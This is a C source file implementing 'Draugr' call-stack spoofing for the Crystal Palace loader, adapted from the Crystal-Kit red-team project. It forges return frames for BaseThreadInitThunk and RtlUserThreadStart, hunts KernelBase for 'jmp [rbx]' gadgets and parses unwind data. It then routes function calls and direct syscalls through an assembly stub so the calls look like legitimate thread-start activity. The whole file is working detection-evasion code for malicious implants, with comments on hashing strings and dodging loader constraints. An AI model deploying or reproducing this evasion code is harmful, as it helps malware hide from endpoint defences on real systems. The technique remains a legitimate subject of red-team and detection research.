/* Draugr call-stack spoofing — adapted from Crystal-Kit (rasta-mouse).
 * DFR macros replace bare GetProcAddress; ROR13 hash replaces string
 * literals; no switch statements (Crystal Palace jump-table constraint). */

#include <windows.h>
#include "tcg.h"
#include "dfr.h"
#include "spoof.h"

#define TEXT_HASH 0xEBC2F9B4 /* ror13(".text\0") */
#define RBP_OP_INFO 0x5
#define MAX_GADGETS 15
#define MAX_ATTEMPTS 15

typedef struct
{
    LPCWSTR DllPath;
    ULONG Offset;
    ULONGLONG TotalStackSize;
    BOOL RequiresLoadLibrary;
    BOOL SetsFramePointer;
    PVOID ReturnAddress;
    BOOL PushRbp;
    ULONG CountOfCodes;
    BOOL PushRbpIndex;
} STACK_FRAME;

typedef enum
{
    UWOP_PUSH_NONVOL = 0,
    UWOP_ALLOC_LARGE,
    UWOP_ALLOC_SMALL,
    UWOP_SET_FPREG,
    UWOP_SAVE_NONVOL,
    UWOP_SAVE_NONVOL_FAR,
    UWOP_SAVE_XMM128 = 8,
    UWOP_SAVE_XMM128_FAR,
    UWOP_PUSH_MACHFRAME
} UNWIND_CODE_OPS;

typedef unsigned char UBYTE;

typedef union
{
    struct
    {
        UBYTE CodeOffset;
        UBYTE UnwindOp : 4;
        UBYTE OpInfo : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE_U;

typedef struct
{
    UBYTE Version : 3;
    UBYTE Flags : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset : 4;
    UNWIND_CODE_U UnwindCode[1];
} UNWIND_INFO_S;

typedef struct
{
    PVOID ModuleAddress;
    PVOID FunctionAddress;
    DWORD Offset;
} FRAME_INFO;

typedef struct
{
    FRAME_INFO Frame1; /* BaseThreadInitThunk */
    FRAME_INFO Frame2; /* RtlUserThreadStart  */
    PVOID Gadget;      /* KernelBase base for FF 23 scan */
} SYNTHETIC_STACK_FRAME;

/* Offsets must match draugr.asm exactly. */
typedef struct
{
    PVOID Fixup;                            /* 0   */
    PVOID OriginalReturnAddress;            /* 8   */
    PVOID Rbx;                              /* 16  */
    PVOID Rdi;                              /* 24  */
    PVOID BaseThreadInitThunkStackSize;     /* 32  */
    PVOID BaseThreadInitThunkReturnAddress; /* 40  */
    PVOID TrampolineStackSize;              /* 48  */
    PVOID RtlUserThreadStartStackSize;      /* 56  */
    PVOID RtlUserThreadStartReturnAddress;  /* 64  */
    PVOID Ssn;                              /* 72  */
    PVOID Trampoline;                       /* 80  */
    PVOID Rsi;                              /* 88  */
    PVOID R12;                              /* 96  */
    PVOID R13;                              /* 104 */
    PVOID R14;                              /* 112 */
    PVOID R15;                              /* 120 */
} DRAUGR_PARAMETERS;

/* Flat-binary stub loaded via linkfunc in loader.spec. */
extern PVOID draugr_stub(PVOID, PVOID, PVOID, PVOID,
                         DRAUGR_PARAMETERS *, PVOID, SIZE_T,
                         PVOID, PVOID, PVOID, PVOID,
                         PVOID, PVOID, PVOID, PVOID);

static void init_frame_info(SYNTHETIC_STACK_FRAME *frame)
{
    PVOID hK32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    PVOID hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");

    frame->Frame1.ModuleAddress = hK32;
    frame->Frame1.FunctionAddress = (PVOID)KERNEL32$GetProcAddress(
        (HMODULE)hK32, "BaseThreadInitThunk");
    frame->Frame1.Offset = 0x17;

    frame->Frame2.ModuleAddress = hNtdll;
    frame->Frame2.FunctionAddress = (PVOID)KERNEL32$GetProcAddress(
        (HMODULE)hNtdll, "RtlUserThreadStart");
    frame->Frame2.Offset = 0x2c;

    frame->Gadget = KERNEL32$GetModuleHandleA("KernelBase.dll");
}

static BOOL get_text_section_size(PVOID module, PDWORD va, PDWORD size)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((UINT_PTR)module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        if (ror13hash((char *)sec[i].Name) == TEXT_HASH)
        {
            *va = sec[i].VirtualAddress;
            *size = sec[i].SizeOfRawData;
            return TRUE;
        }
    }
    return FALSE;
}

static PVOID calculate_function_stack_size(RUNTIME_FUNCTION *rf, const DWORD64 image_base)
{
    STACK_FRAME sf = {0};
    if (!rf)
        return NULL;

    UNWIND_INFO_S *ui = (UNWIND_INFO_S *)(rf->UnwindData + image_base);
    ULONG index = 0;

    while (index < ui->CountOfCodes)
    {
        ULONG op = ui->UnwindCode[index].UnwindOp;
        ULONG info = ui->UnwindCode[index].OpInfo;

        /* if-else avoids jump tables under Crystal Palace */
        if (op == UWOP_PUSH_NONVOL)
        {
            sf.TotalStackSize += 8;
            if (info == RBP_OP_INFO)
            {
                sf.PushRbp = TRUE;
                sf.CountOfCodes = ui->CountOfCodes;
                sf.PushRbpIndex = index + 1;
            }
        }
        else if (op == UWOP_SAVE_NONVOL)
        {
            index += 1;
        }
        else if (op == UWOP_ALLOC_SMALL)
        {
            sf.TotalStackSize += ((ULONGLONG)info * 8) + 8;
        }
        else if (op == UWOP_ALLOC_LARGE)
        {
            index += 1;
            ULONG frame_offset = ui->UnwindCode[index].FrameOffset;
            if (info == 0)
            {
                frame_offset *= 8;
            }
            else
            {
                index += 1;
                frame_offset += (ui->UnwindCode[index].FrameOffset << 16);
            }
            sf.TotalStackSize += frame_offset;
        }
        else if (op == UWOP_SET_FPREG)
        {
            sf.SetsFramePointer = TRUE;
        }
        else if (op == UWOP_SAVE_XMM128)
        {
            return NULL;
        }

        index += 1;
    }

    if (0 != (ui->Flags & UNW_FLAG_CHAININFO))
    {
        index = ui->CountOfCodes;
        if (index & 1)
            index += 1;
        rf = (RUNTIME_FUNCTION *)(&ui->UnwindCode[index]);
        return calculate_function_stack_size(rf, image_base);
    }

    sf.TotalStackSize += 8;
    return (PVOID)(ULONG_PTR)sf.TotalStackSize;
}

static PVOID calculate_function_stack_size_wrapper(PVOID return_address)
{
    DWORD64 image_base = 0;
    if (!return_address)
        return NULL;
    RUNTIME_FUNCTION *rf = KERNEL32$RtlLookupFunctionEntry(
        (DWORD64)return_address, &image_base, NULL);
    if (!rf)
        return NULL;
    return calculate_function_stack_size(rf, image_base);
}

static PVOID find_gadget(PVOID module)
{
    DWORD text_va = 0, text_size = 0, counter = 0;
    ULONG seed = 0x1337;
    PVOID gadget_list[MAX_GADGETS] = {0};

    if (!get_text_section_size(module, &text_va, &text_size))
        return NULL;

    PBYTE text = (PBYTE)((UINT_PTR)module + text_va);
    for (int i = 0; i < (int)(text_size - 2); i++)
    {
        if (text[i] == 0xFF && text[i + 1] == 0x23)
        {
            gadget_list[counter++] = (PVOID)(text + i);
            if (counter == MAX_GADGETS)
                break;
        }
    }
    if (!counter)
        return NULL;

    return gadget_list[NTDLL$RtlRandomEx(&seed) % counter];
}

static ULONG_PTR draugr_wrapper(
    PVOID fn, DWORD ssn,
    PVOID a1, PVOID a2, PVOID a3, PVOID a4,
    PVOID a5, PVOID a6, PVOID a7, PVOID a8,
    PVOID a9, PVOID a10, PVOID a11, PVOID a12)
{
    int attempts = 0;
    DRAUGR_PARAMETERS dp = {0};
    SYNTHETIC_STACK_FRAME frame;
    int _z;
    for (_z = 0; _z < (int)sizeof(frame); _z++)
        ((char *)&frame)[_z] = 0;

    if (ssn)
        dp.Ssn = (PVOID)(ULONG_PTR)ssn;

    init_frame_info(&frame);

    PVOID ret_addr = (PVOID)((UINT_PTR)frame.Frame1.FunctionAddress + frame.Frame1.Offset);
    dp.BaseThreadInitThunkStackSize = calculate_function_stack_size_wrapper(ret_addr);
    dp.BaseThreadInitThunkReturnAddress = ret_addr;
    if (!dp.BaseThreadInitThunkStackSize || !dp.BaseThreadInitThunkReturnAddress)
        return (ULONG_PTR)NULL;

    ret_addr = (PVOID)((UINT_PTR)frame.Frame2.FunctionAddress + frame.Frame2.Offset);
    dp.RtlUserThreadStartStackSize = calculate_function_stack_size_wrapper(ret_addr);
    dp.RtlUserThreadStartReturnAddress = ret_addr;
    if (!dp.RtlUserThreadStartStackSize || !dp.RtlUserThreadStartReturnAddress)
        return (ULONG_PTR)NULL;

    /* Retry until trampoline frame ≥ 0x80 to avoid shallow frames. */
    do
    {
        dp.Trampoline = find_gadget(frame.Gadget);
        dp.TrampolineStackSize = calculate_function_stack_size_wrapper(dp.Trampoline);
        if (++attempts > MAX_ATTEMPTS)
            return (ULONG_PTR)NULL;
    } while (!dp.TrampolineStackSize || ((__int64)dp.TrampolineStackSize < 0x80));

    if (!dp.Trampoline || !dp.TrampolineStackSize)
        return (ULONG_PTR)NULL;

    return (ULONG_PTR)draugr_stub(
        a1, a2, a3, a4,
        &dp, fn, 8,
        a5, a6, a7, a8,
        a9, a10, a11, a12);
}

ULONG_PTR spoof_call(FUNCTION_CALL *call)
{
#define A(i) ((PVOID)(call->argc > (i) ? call->args[(i)] : (ULONG_PTR)NULL))
    return draugr_wrapper(
        call->ptr, call->ssn,
        A(0), A(1), A(2), A(3),
        A(4), A(5), A(6), A(7),
        A(8), A(9), A(10), A(11));
#undef A
}
